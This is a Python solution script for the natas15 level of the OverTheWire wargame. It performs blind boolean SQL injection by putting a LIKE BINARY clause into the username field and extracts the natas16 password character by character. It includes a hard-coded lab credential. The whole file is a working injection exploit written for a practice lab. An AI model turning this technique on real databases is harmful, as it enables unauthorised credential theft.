#! /usr/bi/env python3
'''
first find which chars are in password and store it in filtered envirment
then brute fource them!
sql:
find which character used in password >> SELECT * FROM users WHERE username="natas16" AND password LIKE BINARY %char%
then loop over filtered to find them arrangement
'''

import requests
import string

chars = string.ascii_letters + string.digits
filtered, passwd = '', ''
url = 'http://natas15.natas.labs.overthewire.org/index.php?debug'
auth = requests.auth.HTTPBasicAuth(
    'natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')
success_keyword = 'exists'

i = 0
while i < len(chars):
    char = chars[i]
    i += 1
    data = {'username': 'natas16" and password LIKE BINARY "%' + char + '%" #'}
    print(data)
    try:
        req = requests.post(url, auth=auth, data=data, timeout=7)
    except (requests.exceptions.ConnectTimeout, requests.exceptions.ReadTimeout, requests.exceptions.ConnectionError):
        print('Upper data Gets Network Error1')
        i -= 1
        continue
    if success_keyword in req.text:
        filtered += char

# filtered = 'acehijmnpqtwBEHINORW03569'

print('\033[1m\033[94m' + 'FILTERED   >>> ' + filtered)
for _ in range(32):
    i = 0
    while i < len(filtered):
        char = filtered[i]
        i += 1
        data = {'username': 'natas16" AND password LIKE BINARY "' +
                passwd + char + '%" #'}
        try:
            req = requests.post(url, auth=auth, data=data, timeout=7)
        except (requests.exceptions.ConnectTimeout, requests.exceptions.ReadTimeout, requests.exceptions.ConnectionError):
            print('Upper data Gets Network Error2')
            i -= 1
            continue
        if success_keyword in req.text:
            passwd += char
            print(passwd)
            break
print('\033[1m\033[92m' + 'The password for natas16: ' + passwd)
